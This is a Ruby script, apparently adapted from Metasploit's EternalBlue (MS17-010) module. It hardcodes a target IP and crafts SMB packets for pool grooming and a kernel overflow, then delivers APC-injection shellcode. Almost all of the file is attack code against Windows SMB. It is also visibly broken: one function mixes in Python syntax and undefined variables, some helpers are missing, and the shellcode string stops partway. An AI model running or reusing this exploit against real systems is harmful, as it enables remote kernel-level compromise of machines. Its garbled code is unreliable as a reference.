##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'ruby_smb'
require 'ruby_smb/smb1/packet'
require 'rex/core'
require 'rex/socket'

DATASTORE = {
    'RHOST'   => "192.168.126.136",
    'RPORT'   => "445",
    'MaxExploitAttempts' => 3,
    'GroomAllocations' => 12,
    'GroomDelta' => 5,
    'VerifyTarget' => FALSE,
    'VerifyArch' => FALSE
}
FEALIST = '\x00\x00\x01\x00'      #Length
FEALIST << '\x00'*3000            #600*fea
FEALIST << '\x00\x00\xf3\xbd'     #another fea, value length f3bd
FEALIST << '\x00'*0xf3be

FEALIST << '\x00\x00\x00\x8f'     # overflow fea
FEALIST << '\x00\x10\x01\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf1\xdf\xff\x00\x00\x00\x00\x00\x00\x00\x00 \xf0\xdf\xff\x00\xf1\xdf\xff\x00\x00\x00\x00`\x00\x04\x10\x00\x00\x00\x00\x80\xef\xdf\xff\x00\x00\x00\x00\x10\x00\xd0\xff\xff\xff\xff\xff\x10\x01\xd0\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x00\x04\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\xff\xcf\xff\xff\xff\xff\xff'
FEALIST << '\x12\x34\x56\x78'


def connect_target
  sock = Rex::Socket::Tcp.create(
      {
          'PeerHost' => DATASTORE['RHOST'],
          "PeerPort" => DATASTORE['RPORT']
      }
  );
  sock;
end


  class EternalBlueError < StandardError
  end

  def check
    # todo: create MS17-010 mixin, and hook up auxiliary/scanner/smb/smb_ms17_010
  end

  def exploit
      for i in 1..DATASTORE['MaxExploitAttempts']

        grooms = DATASTORE['GroomAllocations'] + DATASTORE['GroomDelta'] * (i - 1)

        smb_eternalblue(DATASTORE['ProcessName'], grooms)

        # we don't need this sleep, and need to find a way to remove it
        # problem is session_count won't increment until stage is complete :\
        secs = 0
        while !session_created? and secs < 5
          secs += 1
          sleep 1
        end

        if session_created?
          puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          puts("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          break
        else
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
          print_bad("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        end
      end
  end

  def smb_eternalblue(process_name, grooms)
      # Step 0: pre-calculate what we can
      shellcode         = make_kernel_user_payload('\xcc', 0, 0, 0, 0, 0)
      payload_hdr_pkt   = make_smb2_payload_headers_packet
      payload_body_pkt  = make_smb2_payload_body_packet(shellcode)

      # Step 1: Connect to IPC$ share
      puts("Connecting to target for exploitation.")
      client, tree, sock, os = smb1_anonymous_connect_ipc()
      puts("Connection established for exploitation.")

      if !verify_target(os)
        raise EternalBlueError, 'Unable to continue with improper OS Target.'
      end

      if !verify_arch
        raise EternalBlueError, 'Unable to continue with improper OS Arch.'
      end

      puts("Trying exploit with #{grooms} Groom Allocations.")

      # Step 2: Create a large SMB1 buffer
      puts("Sending all but last fragment of exploit packet")
      smb1_large_buffer( client, tree, sock )

      # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
      puts("Starting non-paged pool grooming")

      # initialize_groom_threads(ip, port, payload, grooms)
      fhs_sock = smb1_free_hole(true)

      @groom_socks = []

      puts("Sending SMBv2 buffers")
      smb2_grooms(grooms, payload_hdr_pkt)

      fhf_sock = smb1_free_hole(false)

      puts("Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.")
      fhs_sock.shutdown()

      puts("Sending final SMBv2 buffers.") # 6x
      smb2_grooms(6, payload_hdr_pkt)                     # todo: magic #

      fhf_sock.shutdown()

      puts("Sending last fragment of exploit packet!")
      final_exploit_pkt = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)
      sock.put(final_exploit_pkt)

      puts("Receiving response from exploit packet")
      code, raw = smb1_get_response(sock)

      code_str = "0x" + code.to_i.to_s(16).upcase
      if code.nil?
        print_error("Did not receive a response from exploit packet")
      elsif code == 0xc000000d # STATUS_INVALID_PARAMETER (0xC000000D)
        puts("ETERNALBLUE overwrite completed successfully (#{code_str})!")
      else
        puts("ETERNALBLUE overwrite returned unexpected status code (#{code_str})!")
      end

      # Step 4: Send the payload
      puts("Sending egg to corrupted connection.")

      @groom_socks.each{ |gsock| gsock.put(payload_body_pkt[0...2920] ) }
      @groom_socks.each{ |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }

      puts("Triggering free of corrupted buffer.")
      # tree disconnect
      # logoff and x
      # note: these aren't necessary, just close the sockets
      return true
  end

  def verify_target(os)
    os = os.gsub("\x00", '')  # strip unicode bs
    os << "\x00"              # but original has a null
    ret = true

    if DATASTORE['VerifyTarget']
      ret = false
      # search if its in patterns
      target['os_patterns'].each do |pattern|
        if os.downcase.include? pattern.downcase
          ret = true
          break
        end
      end

      if ret
        puts('Target OS selected valid for OS indicated by SMB reply')
      else
        puts('Target OS selected not valid for OS indicated by SMB reply')
        puts('Disable VerifyTarget option to proceed manually...')
      end
    end

    # cool buffer print no matter what, will be helpful when people post debug issues
    print_core_buffer(os)

    return ret
  end

  # https://github.com/CoreSecurity/impacket/blob/master/examples/getArch.py
  # https://msdn.microsoft.com/en-us/library/cc243948.aspx#Appendix_A_53
  def verify_arch
    ret = false

    return true if !DATASTORE['VerifyArch']

    pkt = Rex::Proto::DCERPC::Packet.make_bind(
      # Abstract Syntax: EPMv4 V3.0
      'e1af8308-5d1f-11c9-91a4-08002b14a0fa', '3.0',
      # Transfer Syntax[1]: 64bit NDR V1
      '71710533-beba-4937-8319-b5dbef9ccc36', '1.0'
    ).first

    sock = connect_target()

    sock.put(pkt)

    begin
      res = sock.get_once(60)
    rescue EOFError
      print_error('DCE/RPC socket returned EOFError')
      return false
    end

    disconnect(sock)

    begin
      resp = Rex::Proto::DCERPC::Response.new(res)
    rescue Rex::Proto::DCERPC::Exceptions::InvalidPacket => e
      print_error(e.to_s)
      return false
    end

    case target_arch.first
    when ARCH_X64
      # Ack result: Acceptance (0)
      if resp.ack_result.first == 0
        ret = true
      end
    when ARCH_X86
      # Ack result: Provider rejection (2)
      # Ack reason: Proposed transfer syntaxes not supported (2)
      if resp.ack_result.first == 2 && resp.ack_reason.first == 2
        ret = true
      end
    end

    if ret
      puts('Target arch selected valid for OS indicated by DCE/RPC reply')
    else
      puts('Target arch selected not valid for OS indicated by DCE/RPC reply')
      puts('Disable VerifyArch option to proceed manually...')
    end

    ret
  end

  def print_core_buffer(os)
    puts("CORE raw buffer dump (#{os.length.to_s} bytes)")

    count = 0
    chunks = os.scan(/.{1,16}/)
    chunks.each do | chunk |
      hexdump = chunk.chars.map { |ch| ch.ord.to_s(16).rjust(2, "0") }.join(" ")

      format = "0x%08x  %-47s  %-16s" % [(count * 16), hexdump, chunk]
      puts(format)
      count += 1
    end
  end

  #
  # Increase the default delay by five seconds since some kernel-mode
  # payloads may not run immediately.
  #
  def wfs_delay
    super + 5
  end


  def smb2_grooms(grooms, payload_hdr_pkt)
    grooms.times do |groom_id|
      gsock = connect_target()
      @groom_socks << gsock
      gsock.put(payload_hdr_pkt)
    end
  end

  def smb1_anonymous_connect_ipc()
    sock = connect_target()
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, username: '', password: '')
    client.negotiate

    pkt = make_smb1_anonymous_login_packet
    sock.put(pkt)

    code, raw, response = smb1_get_response(sock)

    if code.nil?
      raise RubySMB::Error::UnexpectedStatusCode, "No response to login request"
    end

    unless code == 0 # WindowsError::NTStatus::STATUS_SUCCESS
      raise RubySMB::Error::UnexpectedStatusCode, "Error with anonymous login"
    end

    client.user_id = response.uid


    # todo: RubySMB throwing exceptions
    # sess = RubySMB::SMB1::Packet::SessionSetupResponse.new(raw)
    os = raw.split("\x00\x00")[-2]
    # todo: rubysmb should set this automatically?
    #client.peer_native_os = os

    tree = client.tree_connect("\\\\#{DATASTORE['RHOST']}\\IPC$")

    return client, tree, sock, os
  end

  def smb1_large_buffer(client, tree, sock)
    nt_trans_pkt = make_smb1_nt_trans_packet(tree.id, client.user_id, FEALIST[0...2000])

    # send NT Trans
    puts("Sending NT Trans Request packet")
    sock.put(nt_trans_pkt)

    puts("Receiving NT Trans packet")
    raw = sock.get_once

    while i < len(FEALIST) do
      # limit data to 4096 bytes per SMB message because this size can be used for all Windows version
      sendSize = min( 4096, len(data) - 2000 )
      if len(data) - i <= 4096 then
              break
      end
          send_trans2_second(conn, tid, data[i:i+sendSize], i)
          i += sendSize
    end


          # Initial Trans2  request
    trans2_pkt_nulled = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_zero, 0)
    sock.put( trans2_pkt_nulled );
    # send all but last packet
    for i in 1..14
        trans2_pkt_buffed = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_buffer, i)
        sock.put( trans2_pkt_buffed )
    end

    trans2_pkt_echo = make_smb1_echo_packet(tree.id, client.user_id)
    sock.put( trans2_pkt_echo );
    puts("Sending malformed Trans2 packets")

    sock.get_once
  end

  def smb1_free_hole(start)
    sock = connect_target()
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, username: '', password: '')
    client.negotiate

    pkt = ""

    if start
      puts("Sending start free hole packet.")
      pkt = make_smb1_free_hole_session_packet("\x07\xc0", "\x2d\x01", "\xf0\xff\x00\x00\x00")
    else
      puts("Sending end free hole packet.")
      pkt = make_smb1_free_hole_session_packet("\x07\x40", "\x2c\x01", "\xf8\x87\x00\x00\x00")
    end

    #dump_packet(pkt)
    sock.put(pkt)

    puts("Receiving free hole response.")
    sock.get_once

    return sock
  end

  def smb1_get_response(sock)
    raw = nil

    # dirty hack since it doesn't always like to reply the first time...
    16.times do
      raw = sock.get_once
      break unless raw.nil? or raw.empty?
    end

    return nil unless raw
    response = RubySMB::SMB1::SMBHeader.read(raw[4..-1])
    code = response.nt_status
    return code, raw, response
  end

  def make_smb2_payload_headers_packet
    # don't need a library here, the packet is essentially nonsensical
    pkt = ""
    pkt << "\x00"             # session message
    pkt << "\x00\xff\xf7"     # size
    pkt << "\xfeSMB"          # SMB2
    pkt << "\x00" * 124

    pkt
  end

  def make_smb2_payload_body_packet(kernel_user_payload)
    # precalculated lengths
    pkt_max_len = 4204
    pkt_setup_len = 497
    pkt_max_payload = pkt_max_len - pkt_setup_len # 3575

    # this packet holds padding, KI_USER_SHARED_DATA addresses, and shellcode
    pkt = ""

    # padding
    pkt << "\x00" * 0x8
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x1c
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x74

    # KI_USER_SHARED_DATA addresses
    pkt << "\xb0\x00\xd0\xff\xff\xff\xff\xff" * 2 # x64 address
    pkt << "\x00" * 0x10
    pkt << "\xc0\xf0\xdf\xff" * 2                 # x86 address
    pkt << "\x00" * 0xc4

    # payload addreses
    pkt << "\x90\xf1\xdf\xff"
    pkt << "\x00" * 0x4
    pkt << "\xf0\xf1\xdf\xff"
    pkt << "\x00" * 0x40

    pkt << "\xf0\x01\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00" * 0x8
    pkt << "\x00\x02\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00"

    pkt << kernel_user_payload

    # fill out the rest, this can be randomly generated
    pkt << "\x00" * (pkt_max_payload - kernel_user_payload.length)

    pkt
  end

  def make_smb1_echo_packet(tree_id, user_id)
    pkt = ""
    pkt << "\x00"               # type
    pkt << "\x00\x00\x31"       # len = 49
    pkt << "\xffSMB"            # SMB1
    pkt << "\x2b"               # Echo
    pkt << "\x00\x00\x00\x00"   # Success
    pkt << "\x18"               # flags
    pkt << "\x07\xc0"           # flags2
    pkt << "\x00\x00"           # PID High
    pkt << "\x00\x00\x00\x00"   # Signature1
    pkt << "\x00\x00\x00\x00"   # Signature2
    pkt << "\x00\x00"           # Reserved
    pkt << [tree_id].pack("S>") # Tree ID
    pkt << "\xff\xfe"           # PID
    pkt << [user_id].pack("S>") # UserID
    pkt << "\x40\x00"           # MultiplexIDs

    pkt << "\x01"               # Word count
    pkt << "\x01\x00"           # Echo count
    pkt << "\x0c\x00"           # Byte count

    # echo data
    # this is an existing IDS signature, and can be nulled out
    #pkt << "\x4a\x6c\x4a\x6d\x49\x68\x43\x6c\x42\x73\x72\x00"
    pkt <<  "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00"

    pkt
  end
  DATADISPLACEMENT = ["\x03", "\x13", "\x23", "\x33", "\x43", "\x53", "\x63", "\x73", "\x83", "\x93", "\xa3", "\xb3", "\xc3", "\xd3", "\xe3", "\xf3"]
  # Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit
  def make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout)
    timeout = DATADISPLACEMENT[timeout]
    pkt = ""
    pkt << "\x00"                   # Session message
    pkt << "\x00\x10\x35"          # length              Big Endian
    pkt << "\xffSMB"                # SMB1
    pkt << "\x33"                   # Trans2 request
    pkt << "\x00\x00\x00\x00"       # NT SUCCESS
    pkt << "\x18"                   # Flags
    pkt << "\x07\xc0"               # Flags2
    pkt << "\x00\x00"               # PID High
    pkt << "\x00\x00\x00\x00"       # Signature1
    pkt << "\x00\x00\x00\x00"       # Signature2
    pkt << "\x00\x00"               # Reserved
    pkt << [tree_id].pack("S>")       # TreeID
    pkt << "\xff\xfe"               # PID
    pkt << [user_id].pack("S>")       # UserID
    pkt << "\x40\x00"               # MultiplexIDs

    pkt << "\x09"                   # Word Count
    pkt << "\x00\x00"               # Total Param Count
    pkt << "\x00\x10"               # Total Data Count
    pkt << "\x00\x00"               # Param Count
    pkt << "\x00\x00"               # Param Offset
    pkt << "\x00\x00"               # Param Displacement
    pkt << "\x00\x10"               # DataCount
    pkt << "\x35\x00"               # DataOffset
    pkt << "\xd0"
    pkt << timeout                   # DataDisplacement
    pkt << "\x00\x00"               # FID
    pkt << "\x00\x10"               # Byte Count

    #pkt << "\x74\x70"               # Parameter Offset
    #pkt << "\x47\x46"               # Data Count
    #pkt << "\x45\x6f"               # Data Offset
    #pkt << "\x4c"                   # Setup Count
    #pkt << "\x4f"                   # Reserved

    if type == :eb_trans2_exploit
      puts("Making :eb_trans2_exploit packet")

      pkt << "\x41" * 2957

      pkt << "\x80\x00\xa8\x00"                     # overflow

      pkt << "\x00" * 0x10
      pkt << "\xff\xff"
      pkt << "\x00" * 0x6
      pkt << "\xff\xff"
      pkt << "\x00" * 0x16

      pkt << "\x00\xf1\xdf\xff"             # x86 addresses
      pkt << "\x00" * 0x8
      pkt << "\x20\xf0\xdf\xff"

      pkt << "\x00\xf1\xdf\xff\xff\xff\xff\xff" # x64

      pkt << "\x60\x00\x04\x10"
      pkt << "\x00" * 4

      pkt << "\x80\xef\xdf\xff"

      pkt << "\x00" * 4
      pkt << "\x10\x00\xd0\xff\xff\xff\xff\xff"
      pkt << "\x18\x01\xd0\xff\xff\xff\xff\xff"
      pkt << "\x00" * 0x10

      pkt << "\x60\x00\x04\x10"
      pkt << "\x00" * 0xc
      pkt << "\x90\xff\xcf\xff\xff\xff\xff\xff"
      pkt << "\x00" * 0x8
      pkt << "\x80\x10"
      pkt << "\x00" * 0xe
      pkt << "\x39"
      pkt << "\xbb"

      pkt << "\x41" * 965

      return pkt
    end

    if type == :eb_trans2_zero
      puts("Making :eb_trans2_zero packet")
      pkt << "\x00" * 2055
      pkt << "\x83\xf3"
      pkt << "\x41" * 2039
      #pkt << "\x00" * 4096
    else
      puts("Making :eb_trans2_buffer packet")
      pkt << "\x41" * 4096
    end

    pkt

  end


  def make_smb1_nt_trans_packet(tree_id, user_id, data)
    pkt = ""
    pkt << "\x00"                   # Session message
    pkt << "\x00\x04\x38"           # length
    pkt << "\xffSMB"                # SMB1
    pkt << "\xa0"                   # NT Trans
    pkt << "\x00\x00\x00\x00"       # NT SUCCESS
    pkt << "\x18"                   # Flags
    pkt << "\x07\xc0"               # Flags2
    pkt << "\x00\x00"               # PID High
    pkt << "\x00\x00\x00\x00"       # Signature1
    pkt << "\x00\x00\x00\x00"       # Signature2
    pkt << "\x00\x00"               # Reserved
    pkt << [tree_id].pack("S>")       # TreeID
    pkt << "\xff\xfe"               # PID
    pkt << [user_id].pack("S>")       # UserID
    pkt << "\x40\x00"               # MultiplexID

    pkt << "\x14"                   # Word Count
    pkt << "\x01"                   # Max Setup Count
    pkt << "\x00\x00"               # Reserved
    pkt << "\x1e\x00\x00\x00"       # Total Param Count
    pkt << "\x16\x00\x01\x00"       # Total Data Count
    pkt << "\x1e\x00\x00\x00"       # Max Param Count
    pkt << "\x00\x00\x00\x00"       # Max Data Count
    pkt << "\x1e\x00\x00\x00"       # Param Count
    pkt << "\x4c\x00\x00\x00"       # Param Offset,Start
    pkt << "\xd0\x07\x00\x00"       # Data Count
    pkt << "\x6c\x00\x00\x00"       # Data Offset
    pkt << "\x01"                     # Setup Count
    pkt << "\x00\x00"                # Function <unknown>
    pkt << "\x00\x00"                # Unknown NT transaction (0) setup
    pkt << "\xf1\x07"                # Byte Count

    #param
    pkt << "\xff"                    #pad
    pkt << "\x00" * 0x1e             # NT Parameters

    # undocumented
    pkt << "\xff\xff"               #pad
    pkt << data

    pkt
  end

  def make_smb1_free_hole_session_packet(flags2, vcnum, native_os)
    pkt = ""
    pkt << "\x00"                   # Session message
    pkt << "\x00\x00\x51"           # length
    pkt << "\xffSMB"                # SMB1
    pkt << "\x73"                   # Session Setup AndX
    pkt << "\x00\x00\x00\x00"       # NT SUCCESS
    pkt << "\x18"                   # Flags
    pkt << flags2                   # Flags2
    pkt << "\x00\x00"               # PID High
    pkt << "\x00\x00\x00\x00"       # Signature1
    pkt << "\x00\x00\x00\x00"       # Signature2
    pkt << "\x00\x00"               # Reserved
    pkt << "\x00\x00"               # TreeID
    pkt << "\xff\xfe"               # PID
    pkt << "\x00\x00"               # UserID
    pkt << "\x40\x00"               # MultiplexID
    #pkt << "\x00\x00"               # Reserved

    pkt << "\x0c"                   # Word Count
    pkt << "\xff"                   # No further commands
    pkt << "\x00"                   # Reserved
    pkt << "\x00\x00"               # AndXOffset
    pkt << "\x04\x11"               # Max Buffer
    pkt << "\x0a\x00"               # Max Mpx Count
    pkt << vcnum                    # VC Number
    pkt << "\x00\x00\x00\x00"       # Session key
    pkt << "\x00\x00"               # Security blob length
    pkt << "\x00\x00\x00\x00"       # Reserved
    pkt << "\x00\x00\x00\x80"       # Capabilities
    pkt << "\x16\x00"               # Byte count
    #pkt << "\xf0"                   # Security Blob: <MISSING>
    #pkt << "\xff\x00\x00\x00"       # Native OS
    #pkt << "\x00\x00"               # Native LAN manager
    #pkt << "\x00\x00"               # Primary domain
    pkt << native_os
    pkt << "\x00" * 17              # Extra byte params

    pkt
  end

  def make_smb1_anonymous_login_packet
    # Neither Rex nor RubySMB appear to support Anon login?
    pkt = ""
    pkt << "\x00"                   # Session message
    pkt << "\x00\x00\x88"           # length
    pkt << "\xffSMB"                # SMB1
    pkt << "\x73"                   # Session Setup AndX
    pkt << "\x00\x00\x00\x00"       # NT SUCCESS
    pkt << "\x18"                   # Flags
    pkt << "\x07\xc0"               # Flags2
    pkt << "\x00\x00"               # PID High
    pkt << "\x00\x00\x00\x00"       # Signature1
    pkt << "\x00\x00\x00\x00"       # Signature2
    pkt << "\x00\x00"               # TreeID
    pkt << "\xff\xfe"               # PID
    pkt << "\x00\x00"               # Reserved
    pkt << "\x00\x00"               # UserID
    pkt << "\x40\x00"               # MultiplexID

    pkt << "\x0d"                   # Word Count
    pkt << "\xff"                   # No further commands
    pkt << "\x00"                   # Reserved
    pkt << "\x88\x00"               # AndXOffset
    pkt << "\x04\x11"               # Max Buffer
    pkt << "\x0a\x00"               # Max Mpx Count
    pkt << "\x00\x00"               # VC Number
    pkt << "\x00\x00\x00\x00"       # Session key
    pkt << "\x01\x00"               # ANSI pw length
    pkt << "\x00\x00"               # Unicode pw length
    pkt << "\x00\x00\x00\x00"       # Reserved
    pkt << "\xd4\x00\x00\x00"       # Capabilities
    pkt << "\x4b\x00"               # Byte count
    pkt << "\x00"                   # ANSI pw
    pkt << "\x00\x00"               # Account name
    pkt << "\x00\x00"               # Domain name

    # Windows 2000 2195
    pkt << "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
    pkt << "\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00"
    pkt << "\x00\x00"

    # Windows 2000 5.0
    pkt << "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
    pkt << "\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00"

    pkt
  end

  # ring3 = user mode encoded payload
  # proc_name = process to inject APC into
  # ep_thl_b = EPROCESS.ThreadListHead.Blink offset
  # et_alertable = ETHREAD.Alertable offset
  # teb_acp = TEB.ActivationContextPointer offset
  # et_tle = ETHREAD.ThreadListEntry offset
  def make_kernel_user_payload(ring3, proc_name, ep_thl_b, et_alertable, teb_acp, et_tle)
    sc = make_kernel_shellcode
    sc << [ring3.length].pack("S<")
    sc << ring3
    sc
  end

  def make_kernel_shellcode
    # see: external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm
    # Length: 1019 bytes

    #"\xcc"+
    "\x31\xC9\x41\xE2\x01\xC3\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8" +
    "\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A" +
    "\x00\x00\x00\x48\x89\xC2\x48\xC1\xEA\x20\x0F\x30\xC3\x0F\x01\xF8" +
    "\x65\x48\x89\x24\x25\x10\x00\x00\x00\x65\x48\x8B\x24\x25\xA8\x01" +
    "\x00\x00\x50\x53\x51\x52\x56\x57\x55\x41\x50\x41\x51\x41\x52\x41" +
    "\x53\x41\x54\x41\x55\x41\x56\x41\x57\x6A\x2B\x65\xFF\x34\x25\x10" +
    "\x00\x00\x00\x41\x53\x6A\x33\x51\x4C\x89\xD1\x48\x83\xEC\x08\x55" +
    "\x48\x81\xEC\x58\x01\x00\x00\x48\x8D\xAC\x24\x80\x00\x00\x00\x48" +
    "\x89\x9D\xC0\x00\x00\x00\x48\x89\xBD\xC8\x00\x00\x00\x48\x89\xB5" +
    "\xD0\x00\x00\x00\x48\xA1\xF8\x0F\xD0\xFF\xFF\xFF\xFF\xFF\x48\x89" +
    "\xC2\x48\xC1\xEA\x20\x48\x31\xDB\xFF\xCB\x48\x21\xD8\xB9\x82\x00" +
    "\x00\xC0\x0F\x30\xFB\xE8\x38\x00\x00\x00\xFA\x65\x48\x8B\x24\x25" +
    "\xA8\x01\x00\x00\x48\x83\xEC\x78\x41\x5F\x41\x5E\x41\x5D\x41\x5C" +
    "\x41\x5B\x41\x5A\x41\x59\x41\x58\x5D\x5F\x5E\x5A\x59\x5B\x58\x65" +
    "\x48\x8B\x24\x25\x10\x00\x00\x00\x0F\x01\xF8\xFF\x24\x25\xF8\x0F" +
    "\xD0\xFF\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53\x55\x48\x89\xE5" +
    "\x66\x83\xE4\xF0\x48\x83\xEC\x20\x4C\x8D\x35\xE3\xFF\xFF\xFF\x65" +
    "\x4C\x8B\x3C\x25\x38\x00\x00\x00\x4D\x8B\x7F\x04\x49\xC1\xEF\x0C" +
    "\x49\xC1\xE7\x0C\x49\x81\xEF\x00\x10\x00\x00\x49\x8B\x37\x66\x81" +
    "\xFE\x4D\x5A\x75\xEF\x41\xBB\x5C\x72\x11\x62\xE8\x18\x02\x00\x00" +
    "\x48\x89\xC6\x48\x81\xC6\x08\x03\x00\x00\x41\xBB\x7A\xBA\xA3\x30" +
    "\xE8\x03\x02\x00\x00\x48\x89\xF1\x48\x39\xF0\x77\x11\x48\x8D\x90" +
    "\x00\x05\x00\x00\x48\x39\xF2\x72\x05\x48\x29\xC6\xEB\x08\x48\x8B" +
    "\x36\x48\x39\xCE\x75\xE2\x49\x89\xF4\x31\xDB\x89\xD9\x83\xC1\x04" +
    "\x81\xF9\x00\x00\x01\x00\x0F\x8D\x66\x01\x00\x00\x4C\x89\xF2\x89" +
    "\xCB\x41\xBB\x66\x55\xA2\x4B\xE8\xBC\x01\x00\x00\x85\xC0\x75\xDB" +
    "\x49\x8B\x0E\x41\xBB\xA3\x6F\x72\x2D\xE8\xAA\x01\x00\x00\x48\x89" +
    "\xC6\xE8\x50\x01\x00\x00\x41\x81\xF9\xBF\x77\x1F\xDD\x75\xBC\x49" +
    "\x8B\x1E\x4D\x8D\x6E\x10\x4C\x89\xEA\x48\x89\xD9\x41\xBB\xE5\x24" +
    "\x11\xDC\xE8\x81\x01\x00\x00\x6A\x40\x68\x00\x10\x00\x00\x4D\x8D" +
    "\x4E\x08\x49\xC7\x01\x00\x10\x00\x00\x4D\x31\xC0\x4C\x89\xF2\x31" +
    "\xC9\x48\x89\x0A\x48\xF7\xD1\x41\xBB\x4B\xCA\x0A\xEE\x48\x83\xEC" +
    "\x20\xE8\x52\x01\x00\x00\x85\xC0\x0F\x85\xC8\x00\x00\x00\x49\x8B" +
    "\x3E\x48\x8D\x35\xE9\x00\x00\x00\x31\xC9\x66\x03\x0D\xD7\x01\x00" +
    "\x00\x66\x81\xC1\xF9\x00\xF3\xA4\x48\x89\xDE\x48\x81\xC6\x08\x03" +
    "\x00\x00\x48\x89\xF1\x48\x8B\x11\x4C\x29\xE2\x51\x52\x48\x89\xD1" +
    "\x48\x83\xEC\x20\x41\xBB\x26\x40\x36\x9D\xE8\x09\x01\x00\x00\x48" +
    "\x83\xC4\x20\x5A\x59\x48\x85\xC0\x74\x18\x48\x8B\x80\xC8\x02\x00" +
    "\x00\x48\x85\xC0\x74\x0C\x48\x83\xC2\x4C\x8B\x02\x0F\xBA\xE0\x05" +
    "\x72\x05\x48\x8B\x09\xEB\xBE\x48\x83\xEA\x4C\x49\x89\xD4\x31\xD2" +
    "\x80\xC2\x90\x31\xC9\x41\xBB\x26\xAC\x50\x91\xE8\xC8\x00\x00\x00" +
    "\x48\x89\xC1\x4C\x8D\x89\x80\x00\x00\x00\x41\xC6\x01\xC3\x4C\x89" +
    "\xE2\x49\x89\xC4\x4D\x31\xC0\x41\x50\x6A\x01\x49\x8B\x06\x50\x41" +
    "\x50\x48\x83\xEC\x20\x41\xBB\xAC\xCE\x55\x4B\xE8\x98\x00\x00\x00" +
    "\x31\xD2\x52\x52\x41\x58\x41\x59\x4C\x89\xE1\x41\xBB\x18\x38\x09" +
    "\x9E\xE8\x82\x00\x00\x00\x4C\x89\xE9\x41\xBB\x22\xB7\xB3\x7D\xE8" +
    "\x74\x00\x00\x00\x48\x89\xD9\x41\xBB\x0D\xE2\x4D\x85\xE8\x66\x00" +
    "\x00\x00\x48\x89\xEC\x5D\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5E" +
    "\xC3\xE9\xB5\x00\x00\x00\x4D\x31\xC9\x31\xC0\xAC\x41\xC1\xC9\x0D" +
    "\x3C\x61\x7C\x02\x2C\x20\x41\x01\xC1\x38\xE0\x75\xEC\xC3\x31\xD2" +
    "\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x12" +
    "\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x45\x31\xC9\x31\xC0\xAC\x3C" +
    "\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xEE\x45\x39" +
    "\xD9\x75\xDA\x4C\x8B\x7A\x20\xC3\x4C\x89\xF8\x41\x51\x41\x50\x52" +
    "\x51\x56\x48\x89\xC2\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00" +
    "\x00\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\x48" +
    "\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\xE8\x78\xFF\xFF\xFF\x45\x39" +
    "\xD9\x75\xEC\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48" +
    "\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x5E\x59" +
    "\x5A\x41\x58\x41\x59\x41\x5B\x41\x53\xFF\xE0\x56\x41\x57\x55\x48" +
    "\x89\xE5\x48\x83\xEC\x20\x41\xBB\xDA\x16\xAF\x92\xE8\x4D\xFF\xFF" +
    "\xFF\x31\xC9\x51\x51\x51\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00" +
    "\x5A\x48\x83\xEC\x20\x41\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF" +
